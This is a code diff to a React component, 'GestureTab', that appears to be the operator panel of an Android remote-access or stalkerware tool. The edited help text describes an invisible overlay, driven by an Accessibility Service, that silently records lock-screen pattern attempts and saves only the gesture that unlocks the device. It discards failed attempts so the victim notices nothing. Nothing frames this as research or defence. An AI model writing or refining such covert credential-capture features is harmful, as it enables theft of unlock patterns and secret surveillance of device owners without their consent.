@@ -462,13 +462,14 @@ export default function GestureTab({ device, sendCommand, results }) {
               Auto-Capture Gestures
             </div>
             <div style={{ fontSize: 13, color: '#64748b', marginBottom: 10, lineHeight: 1.7 }}>
-              When enabled, the device automatically records complex touch gestures while the screen is <strong style={{ color: '#e2e8f0' }}>on and locked</strong>.
-              Recording pauses when the screen is unlocked. Auto-capture starts automatically when the Accessibility Service is active.
+              When enabled, the overlay is <strong style={{ color: '#e2e8f0' }}>completely invisible</strong> — the device screen looks and behaves normally.
+              Each pattern attempt is recorded silently. Only the gesture that successfully unlocks the device is saved; failed attempts are discarded automatically.
             </div>
             <div style={{ fontSize: 12, color: '#475569', marginBottom: 14, padding: '8px 12px', background: '#0f172a', borderRadius: 8, border: '1px solid #1e293b' }}>
-              📱 Screen ON + LOCKED → Recording active<br />
-              🔓 Screen Unlocked → Recording paused<br />
-              📴 Screen OFF → Recording paused
+              👆 Finger down → gesture recording starts<br />
+              ✅ Finger up + device unlocks → gesture saved<br />
+              ❌ Finger up + still locked → discarded, ready for next attempt<br />
+              🚫 Simple tap (&lt;10 pts) → always discarded
             </div>
             <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
               <button
